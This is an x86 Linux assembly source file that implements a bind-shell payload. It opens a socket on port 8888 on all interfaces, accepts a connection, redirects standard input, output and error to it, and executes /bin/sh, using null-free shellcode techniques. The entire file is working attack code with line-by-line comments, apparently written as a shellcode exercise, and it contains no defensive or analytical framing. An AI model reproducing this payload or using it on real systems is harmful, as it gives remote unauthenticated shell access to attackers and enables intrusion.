; Filename: bind_shell.nasm
; Author:  Shawn Banta
;
; Purpose: Binds to a configurable port and execs a shell on incoming connection

global _start			

section .text
_start:

	; Create the Socket
	; socketcall = 0x66
	xor eax, eax
	mov al, 0x66
	; sys_socket = 0x1
	xor ebx, ebx
	mov bl, 0x1

	; socket parameters
	; AF_INET = 0x2
	; SOCK_STREAM = 0x1
	; Default Protocol for SOCK_STREAM = 0x0
	xor edx, edx
	push edx
	push ebx
	push 0x2
	; save stack location to ecx
	xor ecx, ecx
	mov ecx, esp
	; execute socket syscall
	int 0x80
	; save socketfd to esi
	mov esi, eax


	; Setup bind
	; socketcall = 0x66
	mov al, 0x66
	; sys_bind = 0x2
	mov bl, 0x2
	; AF_INET = 0x2
	; listening port 8888 = 0xB822
	; listen all interfaces = 0x0
	push edx
	push word 0xB822
	push bx
	; save memory location of parameters to ecx
	mov ecx, esp
	; bind(socketfd, mem location of struct, len of struct)
	push 0x10
	push ecx
	push esi
	; save new memory location of bind parameters to ecx
	mov ecx, esp
	; execute bind syscall
	int 0x80

	; Setup listen
	; socketcall = 0x66
	mov al, 0x66
	; sys_listen = 0x4
	mov bl, 0x4
	; listen(socketfd, backlog (0) )
	push edx
	push esi
	; save memory location of listen parameters to ecx
	mov ecx, esp
	; execute listen syscall
	int 0x80

	; Setup accept
	; socketcall = 0x66
	mov al, 0x66
	; sys_accept = 0x5
	mov bl, 0x5
	; accept(socketfd, 0x0, 0x0)
	push edx
	push edx
	push esi
	; save memory location of listen parameters to ecx
	mov ecx, esp
	; execute accept syscall
	int 0x80
	; save clientfd to ebx
	mov ebx, eax


	; I/O Redirection
	; sys_dup2 = 0x3f
	mov al, 0x3f
	; dup2(clientfd,0)
	xor ecx, ecx
	; execute dup2 syscall
	int 0x80
	; dup2(clientfd, 1)
	mov al, 0x3f
	inc ecx
	; execute dup2 syscall
	int 0x80
	; dup2(clientfd, 2)
	mov al, 0x3f
	inc ecx
	; execute dup2 syscall
	int 0x80

	; Execute shell
	; execve = 0x0b
	mov al, 0x0b
	; /bin//sh0x0
	; null terminate /bin//sh
	xor ebx, ebx
	push ebx
	; push hs//
	push 0x68732f2f
	; push nib/
	push 0x6e69622f
	; save memory location of execve parameters to ebx
	mov ebx, esp
	; clear ecx and edx
	xor ecx, ecx
	xor edx, edx
	; execute execve
	int 0x80
